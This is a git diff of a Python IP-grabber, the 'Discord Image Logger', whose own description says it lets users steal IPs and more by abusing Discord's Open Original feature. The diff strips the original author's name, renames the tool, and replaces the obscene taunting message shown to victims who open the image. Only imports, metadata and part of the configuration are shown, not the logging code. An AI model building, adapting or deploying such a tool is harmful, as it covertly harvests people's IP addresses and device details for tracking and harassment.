@@ -1,14 +1,12 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
+__app__ = "app"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "mo"
 
 config = {
     # BASE CONFIG #
@@ -28,7 +26,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True , # Enable the custom message?
-        "message": "abu ruqayah  fucked u ass hole ( m ) ( o ) sended him ", # Message to show
+        "message": "we fucked u ass hole ( m ) ( o ) sended that  ", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
